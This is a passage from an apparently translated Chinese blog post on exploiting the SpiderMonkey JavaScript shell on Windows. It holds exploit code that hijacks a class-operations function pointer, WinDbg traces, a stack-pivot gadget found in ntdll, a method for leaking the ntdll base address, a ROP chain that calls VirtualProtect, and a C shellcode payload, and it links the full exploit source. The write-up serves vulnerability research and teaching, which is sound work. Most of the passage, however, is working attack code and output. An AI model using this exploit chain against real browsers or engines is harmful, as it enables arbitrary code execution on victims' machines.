Add(TargetBase_, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> MemoryBackingObject = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">const</span> MemoryBackingObjectAddress = Pwn.AddrOf(MemoryBackingObject);</span><br><span class="line"><span class="keyword">const</span> ClassMemoryBackingAddress = Pwn.ReadPtr(Add(MemoryBackingObjectAddress, <span class="number">7</span> * <span class="number">8</span>));</span><br><span class="line"><span class="comment">// 0:000&gt; ?? sizeof(js!js::Class)</span></span><br><span class="line"><span class="comment">// unsigned int64 0x30</span></span><br><span class="line"><span class="keyword">const</span> ClassOpsMemoryBackingAddress = Add(ClassMemoryBackingAddress, <span class="number">0x30</span>);</span><br><span class="line">print(<span class="string">'[+] js::Class / js::ClassOps backing memory is @ '</span> + MemoryBackingObjectAddress.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Copy the original Class object into our backing memory, and hijack</span></span><br><span class="line"><span class="comment">// the cOps field.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">MemoryBackingObject.set(Pwn.Read(TargetClasp_, <span class="number">0x30</span>), <span class="number">0</span>);</span><br><span class="line">MemoryBackingObject.set(ClassOpsMemoryBackingAddress.bytes(), <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Copy the original ClassOps object into our backing memory and hijack</span></span><br><span class="line"><span class="comment">// the add property.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">MemoryBackingObject.set(Pwn.Read(TargetcOps, <span class="number">0x50</span>), <span class="number">0x30</span>);</span><br><span class="line">MemoryBackingObject.set(<span class="keyword">new</span> Int64(<span class="string">'0xdeadbeefbaadc0de'</span>).bytes(), <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] Overwriting Target's clasp_ @ "</span> + TargetClasp_Address.toString(<span class="number">16</span>));</span><br><span class="line">Pwn.WritePtr(TargetClasp_Address, ClassMemoryBackingAddress);</span><br><span class="line">print(<span class="string">"[*] Overwriting Target's shape clasp_ @ "</span> + TargetBaseClasp_Address.toString(<span class="number">16</span>));</span><br><span class="line">Pwn.WritePtr(TargetBaseClasp_Address, ClassMemoryBackingAddress);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Let's pull the trigger now.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'[*] Pulling the trigger bebe..'</span>);</span><br><span class="line">Target.im_falling_and_i_cant_turn_back = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<p>请注意，我们还会覆盖 shape 对象中的另一个字段，因为 JavaScript shell 的调试版本具有一个判断，可确保从 shape 中检索的对象类与对象组中的对象类相同。 如果你不这样做，那么你将遇到崩溃：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Assertion failure: shape-&gt;getObjectClass() == getClass(), at c:\Users\over\mozilla-central\js\src\vm/NativeObject-inl.h:659</span><br></pre></td></tr></table></figure></p>
<h3 id="透明的堆栈"><a href="#透明的堆栈" class="headerlink" title="透明的堆栈"></a>透明的堆栈</h3><p>与当下的 EXP 一样，劫持控制流是旅程的开始。 我们想在 JavaScript 中执行任意代码。 为了利用传统的 ROP，我们有四种条件中的三种：</p>
<ul>
<li>我们知道内存在哪里，</li>
<li>我们有办法控制执行，</li>
<li>我们有任意空间来存储链条，不受任何限制，</li>
<li>但是我们没有办法将堆栈转移到我们控制的内存区域。<br>现在，如果我们想将堆栈转移到我们控制的位置，我们需要在劫持控制流时对 CPU 上下文进行某种控制。 我们需要调查如何调用此函数指针并查看是否可以控制任何参数等。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Add a property named by id to obj. */</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">bool</span> <span class="params">(*JSAddPropertyOp)</span><span class="params">(JSContext* cx, JS::HandleObject obj,</span></span></span><br><span class="line"><span class="function"><span class="params">                                JS::HandleId id, JS::HandleValue v)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这里是劫持点的CPU上下文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r</span><br><span class="line">rax=000000000001fff1 rbx=000000469b9ff490 rcx=0000020a7d928800</span><br><span class="line">rdx=000000469b9ff490 rsi=0000020a7d928800 rdi=deadbeefbaadc0de</span><br><span class="line">rip=00007ff658b7b3a2 rsp=000000469b9fefd0 rbp=0000000000000000</span><br><span class="line"> r8=000000469b9ff248  r9=0000020a7deb8098 r10=0000000000000000</span><br><span class="line">r11=0000000000000000 r12=0000020a7da02e10 r13=000000469b9ff490</span><br><span class="line">r14=0000000000000001 r15=0000020a7dbbc0b0</span><br><span class="line">iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202</span><br><span class="line">js!js::NativeSetProperty&lt;js::Qualified&gt;+0x2b52:</span><br><span class="line">00007ff6`58b7b3a2 ffd7            call    rdi &#123;deadbeef`baadc0de&#125;</span><br></pre></td></tr></table></figure></p>
<p>让我们分解这部分：</p>
<ul>
<li>@rdx 是 obj，它是指向 JSObject 的指针（上面脚本中的 Target 。还要注意 @rbx 具有相同的值），</li>
<li>@r8 是 id，它是一个指向 jsid 的指针，描述我们尝试添加的属性的名称，在我们的例子中是im_falling_and_i_cant_turn_back，</li>
<li>@r9 是 v，它是指向 js :: Value 的指针（上面脚本中的 JavaScript 整数 1）。</li>
</ul>
<p>与往常一样，调试器验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dqs @rdx l1</span><br><span class="line">00000046`9b9ff490  0000020a`7da02e10</span><br><span class="line"></span><br><span class="line">0:000&gt; !smdump_jsobject 0x20a7da02e10</span><br><span class="line">20a7da02e10: js!js::TypedArrayObject:       Type: Uint8Array</span><br><span class="line">20a7da02e10: js!js::TypedArrayObject:     Length: 90</span><br><span class="line">20a7da02e10: js!js::TypedArrayObject: ByteLength: 90</span><br><span class="line">20a7da02e10: js!js::TypedArrayObject: ByteOffset: 0</span><br><span class="line">20a7da02e10: js!js::TypedArrayObject:    Content: Uint8Array(&#123;Length:90, ...&#125;)</span><br><span class="line">@$smdump_jsobject(0x20a7da02e10)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0:000&gt; dqs @r8 l1</span><br><span class="line">00000046`9b9ff248  0000020a`7dbaf100</span><br><span class="line"></span><br><span class="line">0:000&gt; dqs 0000020a`7dbaf100</span><br><span class="line">0000020a`7dbaf100  0000001f`00000210</span><br><span class="line">0000020a`7dbaf108  0000020a`7dee2f20</span><br><span class="line"></span><br><span class="line">0:000&gt; da 0000020a`7dee2f20</span><br><span class="line">0000020a`7dee2f20  &quot;im_falling_and_i_cant_turn_back&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0:000&gt; dqs @r9 l1</span><br><span class="line">0000020a`7deb8098  fff88000`00000001</span><br><span class="line"></span><br><span class="line">0:000&gt; !smdump_jsvalue 0xfff8800000000001</span><br><span class="line">1: JSVAL_TYPE_INT32: 0x1</span><br><span class="line">@$smdump_jsvalue(0xfff8800000000001)</span><br></pre></td></tr></table></figure></p>
<p>这并不完美，但看起来我们至少对这里有一定程度的控制。 回想一下，我想我可以走几条路（下面介绍一些）：</p>
<ul>
<li>当 @rdx 指向 Target 对象时，我们可以尝试修改 TypedArray 的内联后备缓冲区来触发 ROP 链，</li>
<li>当 @r8 指向指向我们选择的任意字符串的指针时，我们可以注入一个指向我们的 ROP 链的位置的指针，伪装成属性名称的内容，</li>
<li>当 @r9 指向一个 js :: Value 时，我们可以尝试注入一个 double，一旦编码，就是一个指向我们 ROP 链的位置的有效指针。<br>当时，我只看到一种方式：第一种方式。 我们的想法是创建一个具有最大内联缓冲区的 TypedArray。 利用内联缓冲区意味着更少的内存取消引用使得数据透视更简单。 假设我们设法在那里操作，我们可以有一个非常小的 ROP 链重定向到第二个存储在我们有无限空间的地方。<br>我们正在寻找的 stack-pivot 的小工具如下所示 - 在内联缓冲区中进行旋转：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsp &lt;- [rdx] + X with 0x40 &lt;= X &lt; 0x40 + 90</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>或者 - 在缓冲区中旋转：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsp &lt;- [[rdx] + 0x38]</span><br></pre></td></tr></table></figure></p>
<p>找到这个 pivot 实际上比我想象的要花费更多时间。 我花了很多时间试图手动找到它并尝试各种组合（JOP等）。 这并没有真正发挥作用，我决定编写一个工具，试图转向地址空间中可用的每个可执行字节并模拟前进，直到看到包含标记字节的 rsp 崩溃。失败了一段时间之后，这个解决方案终于奏效了。 它并不完美，因为我想首先只在 js.exe 模块中查找。 事实证明，工具找到的是在 ntdll.dll 中。 又多了复杂的两件事：</p>
<ul>
<li>这意味着我们还需要泄漏 ntdll 模块的基地址。 好吧，这应该不难实现，但只需编写更多代码。</li>
<li>这也意味着现在漏洞利用依赖于随时间变化的系统模块：不同版本的 Windows，ntdll 中的安全更新等，使漏洞利用不可靠。<br>哦，我认为我会首先专注于编写出 EXP ，而不是对可靠性部分感到不好。 那些将是下一个考虑的问题（这就是kaizen.js 试图解决的问题）。<br>这是我的工具最终找到的 gadget：   </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u ntdll+000bfda2 l10</span><br><span class="line">ntdll!TpSimpleTryPost+0x5aeb2:</span><br><span class="line">00007fff`b8c4fda2 f5              cmc</span><br><span class="line">00007fff`b8c4fda3 ff33            push    qword ptr [rbx]</span><br><span class="line">00007fff`b8c4fda5 db4889          fisttp  dword ptr [rax-77h]</span><br><span class="line">00007fff`b8c4fda8 5c              pop     rsp</span><br><span class="line">00007fff`b8c4fda9 2470            and     al,70h</span><br><span class="line">00007fff`b8c4fdab 8b7c2434        mov     edi,dword ptr [rsp+34h]</span><br><span class="line">00007fff`b8c4fdaf 85ff            test    edi,edi</span><br><span class="line">00007fff`b8c4fdb1 0f884a52faff    js      ntdll!TpSimpleTryPost+0x111 (00007fff`b8bf5001)</span><br><span class="line"></span><br><span class="line">0:000&gt; u 00007fff`b8bf5001</span><br><span class="line">ntdll!TpSimpleTryPost+0x111:</span><br><span class="line">00007fff`b8bf5001 8bc7            mov     eax,edi</span><br><span class="line">00007fff`b8bf5003 488b5c2468      mov     rbx,qword ptr [rsp+68h]</span><br><span class="line">00007fff`b8bf5008 488b742478      mov     rsi,qword ptr [rsp+78h]</span><br><span class="line">00007fff`b8bf500d 4883c440        add     rsp,40h</span><br><span class="line">00007fff`b8bf5011 415f            pop     r15</span><br><span class="line">00007fff`b8bf5013 415e            pop     r14</span><br><span class="line">00007fff`b8bf5015 5f              pop     rdi</span><br><span class="line">00007fff`b8bf5016 c3              ret</span><br></pre></td></tr></table></figure>
<p>以下是重要的部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00007fff`b8c4fda3 ff33            push    qword ptr [rbx]</span><br><span class="line">[...]</span><br><span class="line">00007fff`b8c4fda8 5c              pop     rsp</span><br><span class="line">00007fff`b8bf500d 4883c440        add     rsp,40h</span><br><span class="line">[...]</span><br><span class="line">00007fff`b8bf5016 c3              ret</span><br></pre></td></tr></table></figure></p>
<p>当然，如果你跟进了，你可能想知道 @rbx 在劫持点的值是什么，因为我们并没有真正花时间谈论它。 好吧，如果向上滚动一下，你会注意到 @rbx 与 @rdx 的值相同，它是指向描述 Target 的 JSObject 的指针。</p>
<ol>
<li>第一行在堆栈上压栈实际的 JSObject，</li>
<li>第二行将它从堆栈弹出到 @rsp，</li>
<li>第三行添加 0x40，这意味着 @rsp 现在指向 TypedArray 的后备缓冲区，我们完全控制其内容，</li>
<li>最后返回。<br>通过这一点，我们可以控制执行流程，以及控制堆栈:-)。 当时使用的 ntdll 模块可以在<a href="https://github.com/0vercl0k/blazefox/blob/master/js-asserts/ntdll/ntdll.dll" title="这里" target="_blank" rel="noopener">这里</a>获得 。<br>下面将逐步显示执行流程落在上面的 stack-pivot gadget 上，此时调试器的样子：   </li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; bp ntdll+bfda2</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">ntdll!TpSimpleTryPost+0x5aeb2:</span><br><span class="line">00007fff`b8c4fda2 f5              cmc</span><br><span class="line"></span><br><span class="line">0:000&gt; t</span><br><span class="line">ntdll!TpSimpleTryPost+0x5aeb3:</span><br><span class="line">00007fff`b8c4fda3 ff33            push    qword ptr [rbx] ds:000000d8`a93fce78=000002b2f7509140</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">0:000&gt; t</span><br><span class="line">ntdll!TpSimpleTryPost+0x5aeb8:</span><br><span class="line">00007fff`b8c4fda8 5c              pop     rsp</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">0:000&gt; t</span><br><span class="line">ntdll!TpSimpleTryPost+0x11d:</span><br><span class="line">00007fff`b8bf500d 4883c440        add     rsp,40h</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">0:000&gt; t</span><br><span class="line">ntdll!TpSimpleTryPost+0x126:</span><br><span class="line">00007fff`b8bf5016 c3              ret</span><br><span class="line"></span><br><span class="line">0:000&gt; dqs @rsp</span><br><span class="line">000002b2`f7509198  00007ff7`805a9e55 &lt;- Pivot again to a larger space</span><br><span class="line">000002b2`f75091a0  000002b2`f7a75000 &lt;- The stack with our real ROP chain</span><br><span class="line"></span><br><span class="line">0:000&gt; u 00007ff7`805a9e55 l2</span><br><span class="line">00007ff7`805a9e55 5c              pop     rsp</span><br><span class="line">00007ff7`805a9e56 c3              ret</span><br><span class="line"></span><br><span class="line">0:000&gt; dqs 000002b2`f7a75000</span><br><span class="line">000002b2`f7a75000  00007ff7`805fc4ec &lt;- Beginning of the ROP chain that makes this region executable</span><br><span class="line">000002b2`f7a75008  000002b2`f7926400</span><br><span class="line">000002b2`f7a75010  00007ff7`805a31da</span><br><span class="line">000002b2`f7a75018  00000000`000002a8</span><br><span class="line">000002b2`f7a75020  00007ff7`80a9c302</span><br><span class="line">000002b2`f7a75028  00000000`00000040</span><br><span class="line">000002b2`f7a75030  00007fff`b647b0b0 KERNEL32!VirtualProtectStub</span><br><span class="line">000002b2`f7a75038  00007ff7`81921d09</span><br><span class="line">000002b2`f7a75040  11111111`11111111</span><br><span class="line">000002b2`f7a75048  22222222`22222222</span><br><span class="line">000002b2`f7a75050  33333333`33333333</span><br><span class="line">000002b2`f7a75058  44444444`44444444</span><br></pre></td></tr></table></figure>
<h3 id="泄漏-ntdll-基地址"><a href="#泄漏-ntdll-基地址" class="headerlink" title="泄漏 ntdll 基地址"></a>泄漏 ntdll 基地址</h3><p>不幸的是，在解决上述步骤时，又增加了我们要解决的另一个问题。 即使我们找到了一个 pivot，我们现在需要在运行时检索加载 ntdll 模块的位置。<br>由于这个利用的部分已经非常充满了硬编码偏移的写法，因此有一个简单的方法。我们已经有了 js.exe 模块的基地址，我们知道 js.exe 从一堆其他模块中导入了函数，比如 kernel32.dll（但不是 ntdll.dll）。那么从这，dump 出所有从 Kernel32 中导入的函数，并看到如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !dh -a js</span><br><span class="line">[...]</span><br><span class="line">  _IMAGE_IMPORT_DESCRIPTOR 00007ff781e3e118</span><br><span class="line">    KERNEL32.dll</span><br><span class="line">      00007FF781E3D090 Import Address Table</span><br><span class="line">      00007FF781E3E310 Import Name Table</span><br><span class="line">                     0 time date stamp</span><br><span class="line">                     0 Index of first forwarder reference</span><br><span class="line"></span><br><span class="line">0:000&gt; dqs 00007FF781E3D090</span><br><span class="line">00007ff7`81e3d090  00007fff`b647c2d0 KERNEL32!RtlLookupFunctionEntryStub</span><br><span class="line">00007ff7`81e3d098  00007fff`b6481890 KERNEL32!RtlCaptureContext</span><br><span class="line">00007ff7`81e3d0a0  00007fff`b6497390 KERNEL32!UnhandledExceptionFilterStub</span><br><span class="line">00007ff7`81e3d0a8  00007fff`b6481b30 KERNEL32!CreateEventW</span><br><span class="line">00007ff7`81e3d0b0  00007fff`b6481cb0 KERNEL32!WaitForSingleObjectEx</span><br><span class="line">00007ff7`81e3d0b8  00007fff`b6461010 KERNEL32!RtlVirtualUnwindStub</span><br><span class="line">00007ff7`81e3d0c0  00007fff`b647e640 KERNEL32!SetUnhandledExceptionFilterStub</span><br><span class="line">00007ff7`81e3d0c8  00007fff`b647c750 KERNEL32!IsProcessorFeaturePresentStub</span><br><span class="line">00007ff7`81e3d0d0  00007fff`b8c038b0 ntdll!RtlInitializeSListHead</span><br></pre></td></tr></table></figure></p>
<p>kernel32!InitializeSListHead 是从 ntdll!RtlInitializeSListHead <a href="https://blogs.msdn.microsoft.com/oldnewthing/20060719-24/?p=30473" title="前向导出" target="_blank" rel="noopener">前向导出</a>的，那我们能从  js+0190d0d0 出读取到 ntdll 内的地址。从这里，我们可以减去（另一个）硬编码的偏移量来获得基地址。</p>
<h3 id="执行任意代码"><a href="#执行任意代码" class="headerlink" title="执行任意代码"></a>执行任意代码</h3><p>此时，我们可以执行任意大小的 ROP payload 。我们希望它能执行我们选择的任意 Payload 。这非常简单。我们调用VirtualProtect 来使 TypedArray 缓冲区（保存 payload 的缓冲区）有可执行的权限。接着，在那里分支执行。</p>
<p>这是 basic.js 中使用的链：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PAGE_EXECUTE_READWRITE = <span class="keyword">new</span> Int64(<span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">const</span> BigRopChain = [</span><br><span class="line">    <span class="comment">// 0x1400cc4ec: pop rcx ; ret  ;  (43 found)</span></span><br><span class="line">    Add(JSBase, <span class="number">0xcc4ec</span>),</span><br><span class="line">    ShellcodeAddress,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x1400731da: pop rdx ; ret  ;  (20 found)</span></span><br><span class="line">    Add(JSBase, <span class="number">0x731da</span>),</span><br><span class="line">    <span class="keyword">new</span> Int64(Shellcode.length),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x14056c302: pop r8 ; ret  ;  (8 found)</span></span><br><span class="line">    Add(JSBase, <span class="number">0x56c302</span>),</span><br><span class="line">    PAGE_EXECUTE_READWRITE,</span><br><span class="line"></span><br><span class="line">    VirtualProtect,</span><br><span class="line">    <span class="comment">// 0x1413f1d09: add rsp, 0x10 ; pop r14 ; pop r12 ; pop rbp ; ret  ;  (1 found)</span></span><br><span class="line">    Add(JSBase, <span class="number">0x13f1d09</span>),</span><br><span class="line">    <span class="keyword">new</span> Int64(<span class="string">'0x1111111111111111'</span>),</span><br><span class="line">    <span class="keyword">new</span> Int64(<span class="string">'0x2222222222222222'</span>),</span><br><span class="line">    <span class="keyword">new</span> Int64(<span class="string">'0x3333333333333333'</span>),</span><br><span class="line">    <span class="keyword">new</span> Int64(<span class="string">'0x4444444444444444'</span>),</span><br><span class="line">    ShellcodeAddress,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x1400e26fd: jmp rbp ;  (30 found)</span></span><br><span class="line">    Add(JSBase, <span class="number">0xe26fd</span>)</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p>
<p>这里不是编写我自己的 payload 或重新使用互联网上的一个，这是我的 <a href="https://binary.ninja/" title="Binary" target="_blank" rel="noopener">Binary</a>：<a href="https://binary.ninja/" title="Ninja" target="_blank" rel="noopener">Ninja</a> 的 <a href="https://scc.binary.ninja/" title="ShellCode" target="_blank" rel="noopener">ShellCode</a> 编译器。这个想法非常简单，它允许您使用比机器代码更高级别的语言编写与位置无关的 payload 。您可以使用 subset of C 来编写它，然后将其编译为所需的体系架构。   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">void main() &#123;</span><br><span class="line">    STARTUPINFOA Si;</span><br><span class="line">    PROCESS_INFORMATION Pi;</span><br><span class="line">    memset(&amp;Si, 0, sizeof(Si));</span><br><span class="line">    Si.cb = sizeof(Si);</span><br><span class="line">    CreateProcessA(</span><br><span class="line">        NULL,</span><br><span class="line">        &quot;calc&quot;,</span><br><span class="line">        NULL,</span><br><span class="line">        NULL,</span><br><span class="line">        false,</span><br><span class="line">        0,</span><br><span class="line">        NULL,</span><br><span class="line">        NULL,</span><br><span class="line">        &amp;Si,</span><br><span class="line">        &amp;Pi</span><br><span class="line">    );</span><br><span class="line">    ExitProcess(1337);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我用 scc.exe –arch x64 –platform windows scc-payload.cc 和 tada 编译了上面的内容。在尝试之后，我很快发现创建计算器进程时 Payload 会崩溃。我以为我打乱一些东西，那我开始调试它。最后，结果是 scc 的代码生成有一个错误，并不能确保堆栈指针是 16 字节对齐。这是一个问题，因为访问内存的一堆 <a href="https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions" title="SSE" target="_blank" rel="noopener">SSE</a> 指令需要 16 字节对齐的dest / source 位置。在向 <a href="https://vector35.com/" title="Vector35" target="_blank" rel="noopener">Vector35</a> 的人员反映了我的具体问题之后，他们在开发频道中非常快速地修复了它（甚至在我写了一个小的复制品之前， \&lt; 24 小时），这非常了不起。<br>该利用现在正在运行:)。 完整的源代码可在此处获得：<a href="https://github.com/0vercl0k/blazefox/blob/master/exploits/basic.js" title="basic.js" target="_blank" rel="noopener">basic.js</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190822143316-b98aee9e-c4a6-1.gif" alt=""></p>
<h3 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h3><p>我想我们终于成功了。 我实际上已经重写了这个利用至少三次，以使它变得越来越少，也越来越容易。 我真的鼓励你尽可能地努力改进和迭代它。 每当我调整漏洞利用或重写其中的一部分时，我就会学到新东西，完善其他东西，并且变得越来越有控制力。 总的来说，就我而言，没有浪费时间:)。<br>一旦兴奋和喜悦平息下来（可能需要你弹出一百个非常好的计算器:)），仔细看看我们所取得的成就以及我们能够/应该改进的事情总是一件好事。<br>下面是一些我还没做到的点：</p>
<ul>
<li>硬编码偏移量。 这是我一点都不想要的。 在运行时解决我们需要的一切应该很容易。只需要我们编写更多代码。</li>
<li>我们之前发现的 stack pivot 并不是很好。 它特定于上面提到的 ntdll 的特定构建，即使我们能够在运行时在内存中找到它，我们也不能保证，明天它是否存在，或者对我们造成破坏。 因此，尽早摆脱它可能是一个好主意。</li>
<li>拥有这种  double pivot 也不是那么好。 它在代码中有点混乱，如果我们计划重新考虑堆栈数据块，这看起来是不需要我们做太多努力就能解决的问题。</li>
<li>使用我们当前的 EXP ，使 JavaScript shell 继续运行看起来不太容易。我们破坏了一堆寄存器，也不清楚我们可以修复多少个寄存器。</li>
</ul>
<h3 id="kaizen-js"><a href="#kaizen-js" class="headerlink" title="kaizen.js"></a>kaizen.js</h3><p>你可能已经猜到了，kaizen 是上面提到问题的解决方案。首先，我们将摆脱硬编码的偏移并解决运行时所需的一切。我们希望它能够在其他地方运行，比方说，另一个 js.exe 二进制文件。为了实现这一目标，开发了一系列解析 PE 结构和扫描内存的实用程序。<br>下一个重要的事情是摆脱我们的 stack-pivot 对 ntdll 依赖。为此，我决定分析 <a href="https://github.com/mozilla/gecko-dev/tree/master/js/src/jit" title="Spidermonkey 的 JIT 引擎" target="_blank" rel="noopener">Spidermonkey 的 JIT 引擎</a>。历史证明，JIT 引擎对攻击者来说非常有用。也许我们会找到一种对我们有利的方法，但也许不会:)<br>这是我的初步计划。不过在执行之前，有一件事我没有明白。在对各种 PE 实用程序进行编码并开始使用它们之后，我开始观察我的 EXP 时，它崩溃了。哦，这并不有趣。感觉这个崩溃来自我们之前构建的内存访问代码。在第一次exploit中感觉很好，因为我们只读取了一些东西。然后现在它应该会很频繁的使用。这是我遇到的一次崩溃：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(4b9c.3abc): Break instruction exception - code 80000003 (!!! second chance !!!)</span><br><span class="line">js!JS::Value::toObject+0xc0:</span><br><span class="line">00007ff7`645380a0 b911030000      mov     ecx,311h</span><br><span class="line"></span><br><span class="line">0:000&gt; kc</span><br><span class="line"> # Call Site</span><br><span class="line">00 js!JS::Value::toObject</span><br><span class="line">01 